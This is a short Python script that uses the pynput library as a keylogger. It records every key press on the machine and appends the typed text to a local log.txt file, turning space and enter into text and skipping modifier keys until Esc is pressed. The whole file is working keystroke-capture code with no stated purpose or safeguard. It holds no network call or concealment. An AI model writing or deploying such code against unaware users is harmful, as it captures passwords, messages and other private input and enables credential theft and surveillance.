import pynput as pyin

def run_script():
    def pass_data(key):
        data = str(key)
        data = data.replace("'", "")
        if(key == pyin.keyboard.Key.space):
            data = " "
        if(key == pyin.keyboard.Key.shift or key == pyin.keyboard.Key.backspace or key == pyin.keyboard.Key.alt or key == pyin.keyboard.Key.ctrl):
            data = ""
        if(key == pyin.keyboard.Key.enter):
            data = "\n"
        if key == pyin.keyboard.Key.esc:
            exit()
        with open("log.txt", 'a') as f:
            f.write(data)

    with pyin.keyboard.Listener(on_press=pass_data) as l:
        l.join()
